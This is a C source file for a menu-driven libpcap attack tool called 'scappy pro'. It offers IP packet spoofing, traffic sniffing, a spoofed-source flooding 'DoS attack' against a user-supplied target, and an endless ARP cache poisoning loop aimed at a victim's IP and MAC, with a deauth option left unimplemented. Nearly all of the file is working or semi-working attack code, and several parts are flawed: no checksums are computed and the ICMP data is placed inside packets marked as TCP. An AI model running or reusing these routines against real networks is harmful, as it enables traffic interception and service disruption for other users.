#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <stdlib.h>
#include <pcap.h>
#include <netinet/ip.h>
#include <errno.h>

//sudo apt-get uninstall texlive
 
 

#define MAX_PACKET_SIZE 1024

void packet_spoofing() {
  char errbuf[PCAP_ERRBUF_SIZE];
    char packet[MAX_PACKET_SIZE];
    int packet_count = 10;

    // Create or open a pcap handle for sending packets
    pcap_t* pcap_handle = pcap_open_live("eth0", MAX_PACKET_SIZE, 0, 1, errbuf);
    if (pcap_handle == NULL) {
        fprintf(stderr, "Error opening pcap: %s\n", errbuf);
        return ;
    }

        char srcIP[20]="192.168.4.2";
        char dstIP[20];
        printf("dst ip: ");
        scanf("%s", dstIP);


    // printf("Enter the number of packets to send: ");
    // scanf("%d", &packet_count);

    for (int i = 0; i < packet_count; i++) {
        struct ether_header* eth_header = (struct ether_header*)packet;
        struct ip* ip_header = (struct ip*)(packet + sizeof(struct ether_header));

        // Ethernet header
        memset(eth_header->ether_dhost, 0xff, 6); // Destination MAC address (broadcast)
        // You should set the source MAC address to your own MAC address

        eth_header->ether_type = htons(ETHERTYPE_IP);

        // IP header
        ip_header->ip_v = IPVERSION;
        ip_header->ip_hl = 5;
        ip_header->ip_tos = 0;
        ip_header->ip_len = htons(sizeof(struct ip) + 8); // IP header + ICMP header + data
        ip_header->ip_id = htons(0);
        ip_header->ip_off = 0;
        ip_header->ip_ttl = 64;
        ip_header->ip_p = IPPROTO_TCP;
        ip_header->ip_sum = 0; // You should calculate the correct checksum

        // Set source and destination IP addresses (use appropriate values)


        ip_header->ip_src.s_addr = inet_addr(srcIP);
        ip_header->ip_dst.s_addr = inet_addr(dstIP);

        // ICMP header (Echo Request)
        packet[sizeof(struct ether_header) + sizeof(struct ip)] = 8;  // Type 8: Echo Request
        packet[sizeof(struct ether_header) + sizeof(struct ip) + 1] = 0; // Code 0
        packet[sizeof(struct ether_header) + sizeof(struct ip) + 2] = 0; // Checksum
        packet[sizeof(struct ether_header) + sizeof(struct ip) + 3] = 0; // Checksum
        packet[sizeof(struct ether_header) + sizeof(struct ip) + 4] = packet_count >> 8; // Identifier (high byte)
        packet[sizeof(struct ether_header) + sizeof(struct ip) + 5] = packet_count & 0xFF; // Identifier (low byte)
        packet[sizeof(struct ether_header) + sizeof(struct ip) + 6] = 0; // Sequence number
        packet[sizeof(struct ether_header) + sizeof(struct ip) + 7] = 0; // Sequence number

        // You should calculate the ICMP checksum here

        // Add some data (optional)
        for (int i = 0; i < 32; i++) {
            packet[sizeof(struct ether_header) + sizeof(struct ip) + 8 + i] = i;
        }
        if (pcap_sendpacket(pcap_handle, (u_char*)packet, sizeof(packet)) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap_handle));
        } else {
            printf("Sent packet %d\n", i);
        }
        usleep(100000);
    }

    pcap_close(pcap_handle);

}


void packetHandler(u_char* userData, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    // Process and print packet details here
    // You can access packet data using the 'packet' pointer


    // packet src IP
    struct iphdr *ip_header;
    ip_header = (struct iphdr *) (packet + sizeof(struct ether_header));
    struct in_addr source_ip;
    source_ip.s_addr = ip_header->saddr;
    printf("src: %s  ", inet_ntoa(source_ip));

    // packet dst IP
    struct in_addr dest_ip;
    dest_ip.s_addr = ip_header->daddr;
    printf("dst: %s  ", inet_ntoa(dest_ip));

    // packet src MAC
    struct ether_header *eth_header;
    eth_header = (struct ether_header *) packet;
    // printf("src mac: %02x:%02x:%02x:%02x:%02x:%02x  ",
    //        eth_header->ether_shost[0],
    //        eth_header->ether_shost[1],
    //        eth_header->ether_shost[2],
    //        eth_header->ether_shost[3],
    //        eth_header->ether_shost[4],
    //        eth_header->ether_shost[5]);

    // // packet dst MAC
    // struct ether_header *eth_header2;
    // eth_header2 = (struct ether_header *) packet;
    // printf("dst mac: %02x:%02x:%02x:%02x:%02x:%02x  ",
    //        eth_header2->ether_dhost[0],
    //        eth_header2->ether_dhost[1],
    //        eth_header2->ether_dhost[2],
    //        eth_header2->ether_dhost[3],
    //        eth_header2->ether_dhost[4],
    //        eth_header2->ether_dhost[5]);

    //protocol
    // printf("protocol: %d  ", ip_header->protocol);


    printf("Packet Length: %d\n", pkthdr->len);
}

void packetSniffer(const char* filter_expression) {
    char errbuf[PCAP_ERRBUF_SIZE];
    char* dev;
    pcap_t* handle;
    struct bpf_program fp;

 
    // Open the device for packet capture
    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Error opening device: %s\n", errbuf);
        return;
    }

    // Compile and set the filter
    if (pcap_compile(handle, &fp, filter_expression, 0, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "Error compiling filter: %s\n", pcap_geterr(handle));
        return;
    }

    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Error setting filter: %s\n", pcap_geterr(handle));
        return;
    }

    // Start capturing packets
    pcap_loop(handle, 0, packetHandler, NULL);

    pcap_close(handle);
}



void packet_sniffing(){

       char filter_exp[100]; // Max length for the filter expression
    printf("Enter the filter expression (e.g., 'tcp', 'port 80'): \n");
    fflush(stdin);
    fflush(stdout);
    fgets(filter_exp, sizeof(filter_exp), stdin);
       fflush(stdin);
    fflush(stdout);
    filter_exp[strlen(filter_exp) - 1] = '\0'; // Remove the newline character

    packetSniffer(filter_exp);

}

void DoS_attack(){
  
  int count = 1;
  printf("Count: ");
  scanf("%d", &count);

  // make an array of random ip addresses

  char srcIP[][20] = {"172.28.160.37", "172.28.160.38" , "172.28.160.39" };

  int target_port = 80;
  printf("TargetIP: ");
  char target_ip[20] ;
  scanf("%s", target_ip);
  
 
    char errbuf[PCAP_ERRBUF_SIZE];
    char packet[MAX_PACKET_SIZE];
    int packet_count = 0;

    // Create or open a pcap handle for sending packets
    pcap_t* pcap_handle = pcap_open_live("eth0", MAX_PACKET_SIZE, 0, 1, errbuf);
    if (pcap_handle == NULL) {
        fprintf(stderr, "Error opening pcap: %s\n", errbuf);
        return ;
    }

  for(int i=0;i<count;i++){

     struct ether_header* eth_header = (struct ether_header*)packet;
    struct ip* ip_header = (struct ip*)(packet + sizeof(struct ether_header));

    // Ethernet header
    memset(eth_header->ether_dhost, 0xff, 6); // Destination MAC address (broadcast)
    // You should set the source MAC address to your own MAC address

    eth_header->ether_type = htons(ETHERTYPE_IP);

    // IP header
    ip_header->ip_v = IPVERSION;
    ip_header->ip_hl = 5;
    ip_header->ip_tos = 0;
    ip_header->ip_len = htons(sizeof(struct ip) + 8); // IP header + ICMP header + data
    ip_header->ip_id = htons(0);
    ip_header->ip_off = 0;
    ip_header->ip_ttl = 64;
    ip_header->ip_p =  IPPROTO_TCP;
    ip_header->ip_sum = 0; // You should calculate the correct checksum

    // Set source and destination IP addresses (use appropriate values)
 

    ip_header->ip_src.s_addr = inet_addr(srcIP[i%3]);
    ip_header->ip_dst.s_addr = inet_addr(target_ip);

    // ICMP header (Echo Request)
    packet[sizeof(struct ether_header) + sizeof(struct ip)] = 8;  // Type 8: Echo Request
    packet[sizeof(struct ether_header) + sizeof(struct ip) + 1] = 0; // Code 0
    packet[sizeof(struct ether_header) + sizeof(struct ip) + 2] = 0; // Checksum
    packet[sizeof(struct ether_header) + sizeof(struct ip) + 3] = 0; // Checksum
    packet[sizeof(struct ether_header) + sizeof(struct ip) + 4] = count >> 8; // Identifier (high byte)
    packet[sizeof(struct ether_header) + sizeof(struct ip) + 5] = count & 0xFF; // Identifier (low byte)
    packet[sizeof(struct ether_header) + sizeof(struct ip) + 6] = 0; // Sequence number
    packet[sizeof(struct ether_header) + sizeof(struct ip) + 7] = 0; // Sequence number

    // You should calculate the ICMP checksum here

    // // Add some data (optional)
    // for (int i = 0; i < 32; i++) {
    //     packet[sizeof(struct ether_header) + sizeof(struct ip) + 8 + i] = i;
    // }

    if (pcap_sendpacket(pcap_handle, (u_char*)packet, sizeof(packet)) != 0) {
        fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap_handle));
    } else {
        printf(".");
        usleep(1500000);
    }

  }
    printf("\npacket sent\n");

}


void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer) {
    struct ether_header *eth_header;
    struct iphdr *ip_header;
    struct in_addr source_ip;
    u_char *mac_address;

    // get the Ethernet header
    eth_header = (struct ether_header *) buffer;

    // get the source MAC address
    mac_address = eth_header->ether_shost;

    // get the IP header
    ip_header = (struct iphdr *) (buffer + sizeof(struct ether_header));

    // get the source IP address
    source_ip.s_addr = ip_header->saddr;

    // print the MAC and IP addresses
    printf("MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
           mac_address[0], mac_address[1], mac_address[2], mac_address[3], mac_address[4], mac_address[5]);
    printf("IP address: %s\n", inet_ntoa(source_ip));
}
 

int scan() {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    struct bpf_program fp;
    bpf_u_int32 net, mask;

    // open the default network interface for packet capture
    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Error opening device: %s\n", errbuf);
        return 0;
    }

    // get the network address and netmask for the interface
    if (pcap_lookupnet("eth0", &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Error getting network address: %s\n", errbuf);
        return 0;
    }

    // compile the filter expression to capture only IP packets
    if (pcap_compile(handle, &fp, "ip", 0, net) == -1) {
        fprintf(stderr, "Error compiling filter expression: %s\n", pcap_geterr(handle));
        return 0;
    }

    // apply the filter expression to the packet capture handle
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Error setting filter expression: %s\n", pcap_geterr(handle));
        return 0;
    }

    // start capturing packets
    pcap_loop(handle, -1, process_packet, NULL);

    // cleanup
    pcap_freecode(&fp);
    pcap_close(handle);

    return 1;
}


void make_arp_packet(u_char **packet, int *length, int opcode, struct in_addr my_ip, struct in_addr vic_ip, u_char *my_mac, u_char *vic_mac){
	struct ether_header eth;
	struct ether_arp arp;
	
	//fill the ethernet header
	if(opcode == ARPOP_REQUEST){
		for(int i=0; i<6; i++)
			eth.ether_dhost[i] = 0xff;
	}
	else{
		
		for(int i=0; i<6; i++)
			eth.ether_dhost[i] = vic_mac[i];	
	}


	for(int i=0; i<6; i++){
		eth.ether_shost[i] = my_mac[i];
	}

	eth.ether_type = htons(ETHERTYPE_ARP);
	
	memcpy(*packet, &eth, sizeof(eth));
	(*length) += sizeof(eth);

	//fill the arp request header
	arp.arp_hrd = htons(0x0001);
	arp.arp_pro = htons(0x0800);
	arp.arp_hln = 0x06;
	arp.arp_pln = 0x04;
	arp.arp_op = htons(opcode);
	
	for(int i=0; i<6; i++){
		arp.arp_sha[i] = my_mac[i];
	}
	
	if(opcode == ARPOP_REPLY){
		for(int i=0; i<6; i++)
			arp.arp_tha[i] = vic_mac[i];
	}
	else{
			for(int i=0; i<6; i++)
				arp.arp_tha[i] = 0x00;
	}

	memcpy(arp.arp_spa, &my_ip, sizeof(my_ip));
	memcpy(arp.arp_tpa, &vic_ip, sizeof(vic_ip));
	
	memcpy((*packet)+(*length), &arp, sizeof(arp));
	(*length) += sizeof(arp);

}

void arp_attack(){

	struct in_addr my_ip_addr;
	struct in_addr vic_ip_addr;
 
  //my MAC
  u_char my_mac[6];
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) != 0){
		printf("can't get MAC Address\n");
		close(fd);
	}	
	for (int i = 0; i < 6; ++i){
		my_mac[i] = ifr.ifr_addr.sa_data[i];
	}

  //my IP
  char my_ip[20];
  printf("MyIP:");
  scanf("%s", my_ip);
  my_ip_addr.s_addr = inet_addr(my_ip);

  //victimIP 
  char victimIP[20];
  printf("VictimIP:");
  scanf("%s", victimIP);
  //add this to vic_ip_addr
  vic_ip_addr.s_addr = inet_addr(victimIP);


  //victim MAC
  u_char victim_mac[6];
  printf("VictimMAC:");
  scanf("%02x:%02x:%02x:%02x:%02x:%02x", &victim_mac[0], &victim_mac[1], &victim_mac[2], &victim_mac[3], &victim_mac[4], &victim_mac[5]);

  


  // printf("Heeey\n");

  u_char *packet;
  int length = 0;
  packet = (u_char *)malloc(sizeof(u_char) * 100);
  make_arp_packet(&packet, &length, ARPOP_REPLY, my_ip_addr, vic_ip_addr, my_mac, victim_mac);
  
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t*  handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", "eth0", errbuf);
    }


  while(1){
		if(pcap_sendpacket(handle, packet, length) != 0)
			fprintf(stderr, "\nError sending the packet : %s\n", pcap_geterr(handle));
	
		sleep(1);
	}	  

}


int main() {


  //print a banner saying "scappy pro" using ascci art mate it 4 line banner
  // how to change couluor of print in c
  //for red
  //clean the screen
  system("clear");
  
  printf("\033[1;31m");

  puts(
                                                                              
                      "\n"                                                     
                      "\n"                                                     
                      "\n"                                                                                                        
" .d888b, d8888b d888b8b  ?88,.d88b,?88   d8P     ?88,.d88b,  88bd88b d8888b  \n"
" ?8b,   d8P' `Pd8P' ?88  `?88'  ?88d88   88      `?88'  ?88  88P'  `d8P' ?88 \n"
"   `?8b 88b    88b  ,88b   88b  d8P?8(  d88        88b  d8P d88     88b  d88 \n"
"`?888P' `?888P'`?88P'`88b  888888P'`?88P'?8b       888888P'd88'     `?8888P' \n"
"                           88P'           )88      88P'                      \n"
"                          d88            ,d8P     d88                        \n"
"                          ?8P         `?888P'     ?8P                       "
  );

  //for white
  printf("\033[0m");
  printf("\t \t \t \t  \t \t \t \t by @muaad_\n");
  int choice;
  printf("Select an option: \n\n");
  printf("1. packet spoofing \n");
  printf("2. packet sniffing \n");
  printf("3. DoS attack \n");
  printf("4. ARP Cache Poisoning\n");
  printf("5. Deauth attack \n");
  printf("6. Exit \n \n \n");
  
while(1){

  scanf("%d", &choice);
  switch (choice){
    case 1:{
      printf("packet spoofing ...\n");
      packet_spoofing();
      break;
    }
    case 2:{
      printf("packet sniffing ...\n");
      packet_sniffing();
      break;
    }
    case 3:{
      printf("DoS attack ...\n");
      DoS_attack();
      break;
    }
    case 4:{
      printf("ARP attack ...\n");
      arp_attack();
      break;
    }
    case 5:{
      printf("Deauth attack ...\n");
      // deauth();
      break;
    }
 
    case 6:{
      printf("Exit ...\n");
      return 0;
    }
  }

}


    return 0;
}